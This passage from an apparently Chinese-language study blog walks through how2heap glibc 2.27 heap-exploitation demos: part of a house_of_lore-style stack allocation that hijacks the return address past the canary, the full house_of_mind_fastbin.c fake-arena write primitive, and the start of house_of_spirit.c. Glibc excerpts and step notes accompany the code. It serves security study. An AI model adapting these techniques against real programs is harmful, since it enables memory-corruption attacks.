  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This means that the chunk %p will be inserted in front of the SmallBin\n"</span><span class="token punctuation">,</span> victim<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">void</span> <span class="token operator">*</span>p2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n"</span><span class="token punctuation">,</span> p2<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"The victim chunk has been sorted and its fwd and bk pointers updated\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"victim->fwd: %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>victim<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"victim->bk: %p\n\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>victim<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">//------------VULNERABILITY-----------</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now emulating a vulnerability that can overwrite the victim->bk pointer\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  victim<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">intptr_t</span><span class="token punctuation">)</span>stack_buffer_1<span class="token punctuation">;</span> <span class="token comment">// victim->bk is pointing to stack</span>

  <span class="token comment">//------------------------------------</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now take all dummies chunk in tcache out\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">7</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now allocating a chunk with size equal to the first one freed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">void</span> <span class="token operator">*</span>p3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>p4 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"p4 = malloc(0x100)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n"</span><span class="token punctuation">,</span>
         stack_buffer_2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\np4 is %p and should be on the stack!\n"</span><span class="token punctuation">,</span> p4<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// this chunk will be allocated on stack</span>
  <span class="token class-name">intptr_t</span> sc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">intptr_t</span><span class="token punctuation">)</span>jackpot<span class="token punctuation">;</span> <span class="token comment">// Emulating our in-memory shellcode</span>
  
  <span class="token keyword">long</span> offset <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token function">__builtin_frame_address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>p4<span class="token punctuation">;</span>
  <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span>p4<span class="token operator">+</span>offset<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>sc<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// This bypasses stack-smash detection since it jumps over the canary</span>

  <span class="token comment">// sanity check</span>
  <span class="token function">assert</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token function">__builtin_return_address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>jackpot<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>申请8个chunk：data指针存入dummies数组</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220624220350602.png"></p>
<p>fake_freelist:</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220624222959464.png"></p>
<p>stack_buffer:</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220624223427193.png"></p>
<p>申请一个0x3f0大小的chunk</p>
<p>释放7个chunk进入tcache，再释放第一个victim：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220624221439813.png"></p>
<p>申请一个0x4c0的chunk</p>
<p>此时第一个chunk victim进入smallbin：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220624224235811.png"></p>
<p>修改victim的bk指针，指向buffer1</p>
<p>将tcache中的chunk申请出来：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220624224014710.png"></p>
<p>再申请一个chunk，malloc将会从small bin头开始遍历</p>
<p>申请出victim，接下来会将剩下的bin填满tcache：</p>
<p>原本small bin：buffer1-&gt;buffer2-&gt;freelist1-&gt;freelist2-&gt;……-&gt;freelist7</p>
<p>现在tcache：freelist5-&gt;freelist4-&gt;……-&gt;freelist1-&gt;buffer2-&gt;buffer1</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220624224614157.png"></p>
<p>接下来再申请一个chunk就是栈区的地址</p>
<p><strong>注意点：</strong></p>
<p>small bin并入tcache：与fastbin类似</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>tcache <span class="token operator">&amp;&amp;</span> tc_idx <span class="token operator">&lt;</span> mp_<span class="token punctuation">.</span>tcache_bins<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
      mchunkptr tc_victim<span class="token punctuation">;</span>

      <span class="token comment">/* While bin not empty and tcache not full, copy chunks over.  */</span>
      <span class="token keyword">while</span> <span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">&lt;</span> mp_<span class="token punctuation">.</span>tcache_count
	     <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>tc_victim <span class="token operator">=</span> <span class="token function">last</span> <span class="token punctuation">(</span>bin<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> bin<span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
	  <span class="token keyword">if</span> <span class="token punctuation">(</span>tc_victim <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
	    <span class="token punctuation">&#123;</span>
	      bck <span class="token operator">=</span> tc_victim<span class="token operator">-></span>bk<span class="token punctuation">;</span>
	      <span class="token function">set_inuse_bit_at_offset</span> <span class="token punctuation">(</span>tc_victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>
	      <span class="token keyword">if</span> <span class="token punctuation">(</span>av <span class="token operator">!=</span> <span class="token operator">&amp;</span>main_arena<span class="token punctuation">)</span>
		<span class="token function">set_non_main_arena</span> <span class="token punctuation">(</span>tc_victim<span class="token punctuation">)</span><span class="token punctuation">;</span>
	      bin<span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>
	      bck<span class="token operator">-></span>fd <span class="token operator">=</span> bin<span class="token punctuation">;</span>

	      <span class="token function">tcache_put</span> <span class="token punctuation">(</span>tc_victim<span class="token punctuation">,</span> tc_idx<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
</code></pre>





<h3 id="house-of-mind-fastbin-c"><a href="#house-of-mind-fastbin-c" class="headerlink" title="house_of_mind_fastbin.c"></a>house_of_mind_fastbin.c</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"House of Mind - Fastbin Variant\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"=================================="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The goal of this technique is to create a fake arena\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"at an offset of HEAP_MAX_SIZE\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Then, we write to the fastbins when the chunk is freed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This creates a somewhat constrained WRITE-WHERE primitive\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// Values for the allocation information.	</span>
	<span class="token keyword">int</span> HEAP_MAX_SIZE <span class="token operator">=</span> <span class="token number">0x4000000</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> MAX_SIZE <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">128</span><span class="token operator">*</span><span class="token number">1024</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x100</span><span class="token punctuation">;</span> <span class="token comment">// MMap threshold: https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L635</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Find initial location of the heap\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// The target location of our attack and the fake arena to use</span>
	<span class="token class-name">uint8_t</span><span class="token operator">*</span> fake_arena <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
	<span class="token class-name">uint8_t</span><span class="token operator">*</span> target_loc <span class="token operator">=</span> fake_arena <span class="token operator">+</span> <span class="token number">0x30</span><span class="token punctuation">;</span>

	<span class="token class-name">uint8_t</span><span class="token operator">*</span> target_chunk <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span> fake_arena <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Set 'system_mem' (offset 0x888) for fake arena\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	fake_arena<span class="token punctuation">[</span><span class="token number">0x888</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xFF</span><span class="token punctuation">;</span>
	fake_arena<span class="token punctuation">[</span><span class="token number">0x889</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xFF</span><span class="token punctuation">;</span> 
	fake_arena<span class="token punctuation">[</span><span class="token number">0x88a</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xFF</span><span class="token punctuation">;</span> 

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Target Memory Address for overwrite: %p\n"</span><span class="token punctuation">,</span> target_loc<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Must set data at HEAP_MAX_SIZE (0x%x) offset\n"</span><span class="token punctuation">,</span> HEAP_MAX_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Calculate the location of our fake arena</span>
	<span class="token class-name">uint64_t</span> new_arena_value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span> target_chunk<span class="token punctuation">)</span> <span class="token operator">+</span> HEAP_MAX_SIZE<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token punctuation">(</span>HEAP_MAX_SIZE <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">uint64_t</span><span class="token operator">*</span> fake_heap_info <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span> new_arena_value<span class="token punctuation">;</span>

	<span class="token class-name">uint64_t</span><span class="token operator">*</span> user_mem <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>MAX_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Fake Heap Info struct location: %p\n"</span><span class="token punctuation">,</span> fake_heap_info<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Allocate until we reach a MAX_HEAP_SIZE offset\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	

	<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span>user_mem <span class="token operator">&lt;</span> new_arena_value<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
		user_mem <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>MAX_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token comment">// Use this later to trigger craziness</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Create fastbin sized chunk to be victim of attack\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">uint64_t</span><span class="token operator">*</span> fastbin_chunk <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Size of 0x60</span>
	<span class="token class-name">uint64_t</span><span class="token operator">*</span> chunk_ptr <span class="token operator">=</span> fastbin_chunk <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment">// Point to chunk instead of mem</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Fastbin Chunk to overwrite: %p\n"</span><span class="token punctuation">,</span> fastbin_chunk<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Fill up the TCache so that the fastbin will be used\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// Fill the tcache to make the fastbin to be used later. </span>
	<span class="token class-name">uint64_t</span><span class="token operator">*</span> tcache_chunks<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">7</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
		tcache_chunks<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>	
	<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">7</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
		<span class="token function">free</span><span class="token punctuation">(</span>tcache_chunks<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Setting 'ar_ptr' (our fake arena)  in heap_info struct to %p\n"</span><span class="token punctuation">,</span> fake_arena<span class="token punctuation">)</span><span class="token punctuation">;</span>
	fake_heap_info<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span> fake_arena<span class="token punctuation">;</span> <span class="token comment">// Setting the fake ar_ptr (arena)</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Target Write at %p prior to exploitation: 0x%x\n"</span><span class="token punctuation">,</span> target_loc<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>target_loc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Set non-main arena bit on the fastbin chunk\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"NOTE: This keeps the next chunk size valid because the actual chunk size was never changed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	chunk_ptr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x60</span> <span class="token operator">|</span> <span class="token number">0x4</span><span class="token punctuation">;</span> <span class="token comment">// Setting the non-main arena bit</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"When we free the fastbin chunk with the non-main arena bit\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"set, it will cause our fake 'heap_info' struct to be used.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This will dereference our fake arena location and write\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"the address of the heap to an offset of the arena pointer.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Trigger the magic by freeing the chunk!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">free</span><span class="token punctuation">(</span>fastbin_chunk<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Trigger the madness</span>

	<span class="token comment">// For this particular fastbin chunk size, the offset is 0x28. </span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Target Write at %p: 0x%llx\n"</span><span class="token punctuation">,</span> target_loc<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>target_loc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">assert</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>target_loc<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>分配一个0x1010的fake_arena：</p>
<p>fake_arena+0x30作为改写地址</p>
<p><strong>Glibc2.27  arena结构体：</strong></p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">malloc_state</span>
<span class="token punctuation">&#123;</span>
  <span class="token comment">/* Serialize access.  */</span>
  <span class="token function">__libc_lock_define</span> <span class="token punctuation">(</span><span class="token punctuation">,</span> mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">/* Flags (formerly in max_fast).  */</span>
  <span class="token keyword">int</span> flags<span class="token punctuation">;</span>

  <span class="token comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span>
  <span class="token comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span>
  <span class="token keyword">int</span> have_fastchunks<span class="token punctuation">;</span>

  <span class="token comment">/* Fastbins */</span>
  mfastbinptr fastbinsY<span class="token punctuation">[</span>NFASTBINS<span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span>
  mchunkptr top<span class="token punctuation">;</span>

  <span class="token comment">/* The remainder from the most recent split of a small request */</span>
  mchunkptr last_remainder<span class="token punctuation">;</span>

  <span class="token comment">/* Normal bins packed as described above */</span>
  mchunkptr bins<span class="token punctuation">[</span>NBINS <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token comment">/* Bitmap of bins */</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> binmap<span class="token punctuation">[</span>BINMAPSIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token comment">/* Linked list */</span>
  <span class="token keyword">struct</span> <span class="token class-name">malloc_state</span> <span class="token operator">*</span>next<span class="token punctuation">;</span>

  <span class="token comment">/* Linked list for free arenas.  Access to this field is serialized
     by free_list_lock in arena.c.  */</span>
  <span class="token keyword">struct</span> <span class="token class-name">malloc_state</span> <span class="token operator">*</span>next_free<span class="token punctuation">;</span>

  <span class="token comment">/* Number of threads attached to this arena.  0 if the arena is on
     the free list.  Access to this field is serialized by
     free_list_lock in arena.c.  */</span>
  INTERNAL_SIZE_T attached_threads<span class="token punctuation">;</span>

  <span class="token comment">/* Memory allocated from the system in this arena.  */</span>
  INTERNAL_SIZE_T system_mem<span class="token punctuation">;</span>
  INTERNAL_SIZE_T max_system_mem<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>

<p>与2.23区别：</p>
<p>多了一个have_fastchunks成员变量</p>
<p>&#x3D;&#x3D;&#x3D;》设置system_mem为0xFFFFFF：</p>
<p>该标志用于表示这个arena管理的空间大小</p>
<p>用于malloc的检查：</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">//该检查用于分配unsorted bin和large bin前进行，表明请求的内存不饿能大于system_mem</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">chunksize_nomask</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">2</span> <span class="token operator">*</span> SIZE_SZ<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
              <span class="token operator">||</span> <span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">chunksize_nomask</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span>
				   <span class="token operator">></span> av<span class="token operator">-></span>system_mem<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"malloc(): memory corruption"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>



<p>&#x3D;&#x3D;》继续申请0x4000000的chunk</p>
<p>再继续分配0x1ff00的chunk（该大小小于mmap申请的范围，不触发mmap）</p>
<p>再申请一个0x60的chunk：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220625191517007.png"></p>
<p>再申请7个chunk用于填充tcache：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220625191624173.png"></p>
<p>&#x3D;&#x3D;》接下来就是修改fake_heap_info:</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_heap_info</span>
<span class="token punctuation">&#123;</span>
  mstate ar_ptr<span class="token punctuation">;</span> <span class="token comment">/* Arena for this heap. */</span>
  <span class="token keyword">struct</span> <span class="token class-name">_heap_info</span> <span class="token operator">*</span>prev<span class="token punctuation">;</span> <span class="token comment">/* Previous heap. */</span>
  <span class="token class-name">size_t</span> size<span class="token punctuation">;</span>   <span class="token comment">/* Current size in bytes. */</span>
  <span class="token class-name">size_t</span> mprotect_size<span class="token punctuation">;</span> <span class="token comment">/* Size in bytes that has been mprotected
                           PROT_READ|PROT_WRITE.  */</span>
  <span class="token comment">/* Make sure the following data is properly aligned, particularly
     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of
     MALLOC_ALIGNMENT. */</span>
  <span class="token keyword">char</span> pad<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span> <span class="token operator">*</span> SIZE_SZ <span class="token operator">&amp;</span> MALLOC_ALIGN_MASK<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> heap_info<span class="token punctuation">;</span>
</code></pre>

<p>将计算得到的fake_arena地址的开头写入ar_ptr</p>
<p>修改0x60 chunk的non_main_arena标志位</p>
<p>&#x3D;&#x3D;&#x3D;》释放chunk，libc会根据heap_info的ar_ptr找到我们的假chunk&#x3D;&#x3D;》实现在假chunk中更改内容</p>
<h3 id="house-of-spirit-c"><a href="#house-of-spirit-c" class="headerlink" title="house_of_spirit.c"></a>house_of_spirit.c</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">void</span> <span class="token operator">*</span>chunks<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
